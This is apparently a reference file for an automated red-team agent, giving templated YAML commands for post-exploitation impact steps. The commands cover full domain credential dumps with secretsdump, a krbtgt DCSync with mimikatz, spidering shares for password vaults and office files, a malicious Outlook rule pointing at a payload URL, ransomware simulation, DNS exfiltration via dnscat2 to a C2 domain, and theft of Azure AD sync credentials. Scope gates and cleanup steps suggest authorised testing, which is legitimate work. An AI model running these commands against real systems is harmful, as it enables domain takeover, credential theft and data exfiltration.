# Impact — Tool commands reference

Templated commands the `ImpactAgent` dispatches. All destructive simulations
require both a scope flag in `context.scope.simulations` AND a per-action ACK
token in `context.acks[]`.

Placeholders documented in
[../../discovering-environment/reference/tool-commands.md](../../discovering-environment/reference/tool-commands.md).

## Contents
- impacket-secretsdump (I1 proof)
- mimikatz (I1 alt, I2)
- crackmapexec (I2 validate, I3 listing)
- mailsniper / ruler (I6 BEC)
- atomic-red-team / caldera (I5, I11)
- attack-navigator export (I4)
- dnscat2 (I8 dummy exfil)
- aadinternals (I10 hybrid)

## `impacket-secretsdump`  (I1 proof copy)

```yaml
tool: impacket-secretsdump
opsec: moderate
destructive_gate: true
commands:
  - id: full_domain
    cmd: |
      secretsdump.py '{{ context.scope.domains[0] }}/{{ creds.da.username }}@{{ hosts.first(role='DC').ip }}' \
        {{ creds.da | as_impacket_secret }} \
        -just-dc -outputfile {{ artifact.path }}/dc_dump
    parser: parsers.secretsdump_full
    on_success:
      - "vault.store_all(dc_dump.*)"
      - "findings[] += impact/dcsync_full priority=critical"
      - "report.exhibits += DA-Proof-1"
```

## `mimikatz`  (I1 alt / I2 DA shell)

```yaml
tool: mimikatz
opsec: loud
preconditions: ["host.target.role == 'DC'", "creds.da is not null"]
commands:
  - id: dcsync_krbtgt
    cmd: '"lsadump::dcsync /user:{{ context.scope.domains[0] }}/krbtgt /domain:{{ context.scope.domains[0] }}" exit'
    parser: parsers.mimikatz_dcsync
```

## `crackmapexec`  (I2 validation, I3 listing)

```yaml
tool: crackmapexec
opsec: moderate
commands:
  - id: dc_validate
    cmd: "crackmapexec smb {{ hosts | dcs_ips }} -u {{ creds.da.username }} {{ creds.da | as_cme_secret }} --json"
    parser: parsers.cme
    on_success: ["findings[] += impact/da_validated"]
  - id: crown_jewel_listing
    cmd: "crackmapexec smb {{ target.host.ip }} -u {{ creds.da.username }} {{ creds.da | as_cme_secret }} -M spider_plus -o EXTENSIONS=xlsx,docx,pdf,kdbx OUTPUT_FOLDER={{ artifact.path }}/spider"
    parser: parsers.cme_module
    notes: "Only file *names* and metadata are captured; content download disabled by the parser."
```

## `mailsniper` / `ruler`  (I6 BEC simulation)

```yaml
tool: mailsniper
opsec: moderate
destructive_gate: true
preconditions: ["context.scope.simulations contains 'bec'"]
commands:
  - id: search_mailbox
    cmd: |
      Invoke-SelfSearch -Mailbox '{{ bec.executive_mailbox }}' \
        -Remote -ExchHostname '{{ exchange.fqdn }}' \
        -Terms 'wire,invoice,confidential' -OutputCsv {{ artifact.path }}/bec.csv
    parser: parsers.mailsniper

tool: ruler
opsec: moderate
destructive_gate: true
commands:
  - id: rule_create
    cmd: "ruler --email '{{ bec.executive_mailbox }}' --domain '{{ context.scope.domains[0] }}' add --location '{{ ruler.payload_url }}' --trigger '{{ ruler.subject_trigger }}' --name 'IT-Update'"
    parser: parsers.ruler
    cleanup_cmd: "ruler delete --name 'IT-Update'"
```

## `atomic-red-team` / `caldera`  (I5, I11)

```yaml
tool: atomic-red-team
opsec: declared
destructive_gate: true
preconditions:
  - "context.scope.simulations contains 'ransomware'"
  - "target.host.tag == 'isolated_test_host'"
commands:
  - id: t1486_sim
    cmd: "Invoke-AtomicTest T1486 -TestNumbers 1 -PathToAtomicsFolder {{ atomics.path }} -GetPreReqs; Invoke-AtomicTest T1486 -TestNumbers 1 -PathToAtomicsFolder {{ atomics.path }}"
    parser: parsers.atomic
    cleanup_cmd: "Invoke-AtomicTest T1486 -TestNumbers 1 -PathToAtomicsFolder {{ atomics.path }} -Cleanup"

tool: caldera
opsec: declared
commands:
  - id: purple_replay
    cmd: "curl -s -X POST {{ caldera.api }}/api/v2/operations -d @{{ artifact.path }}/replay.json"
    parser: parsers.caldera
```

## `attack-navigator-export`  (I4 reporting)

```yaml
tool: attack-navigator-export
opsec: build-time
commands:
  - id: build_layer
    cmd: "python tools/attack_layer.py --input {{ session.memory_path }} --output {{ report.path }}/attack_navigator.json"
    parser: parsers.attack_layer
```

## `dnscat2`  (I8 dummy exfil)

```yaml
tool: dnscat2
opsec: stealth
destructive_gate: true
preconditions: ["context.scope.simulations contains 'exfil'"]
commands:
  - id: dummy_exfil
    cmd: 'dnscat2-client --secret={{ c2.dns_secret }} {{ context.c2.dns_domain }} -f {{ artifact.path }}/dummy.bin'
    parser: parsers.dnscat_session
    notes: "Dummy payload is a generated 10MB random file; never real client data."
```

## `aadinternals`  (I10 hybrid)

```yaml
tool: aadinternals
opsec: stealth
destructive_gate: true
preconditions: ["context.scope.azure_tenant is not null", "creds.da is not null"]
commands:
  - id: dump_aadconnect_sync
    cmd: "Get-AADIntSyncCredentials"
    parser: parsers.aadinternals
  - id: prove_global_admin
    cmd: "Connect-AADIntAzureAD -AccessToken (Get-AADIntAccessTokenForAADGraph -Credentials {{ creds.aad.synccreds_ref }}); Get-AADIntGlobalAdmins"
    parser: parsers.aadinternals
```
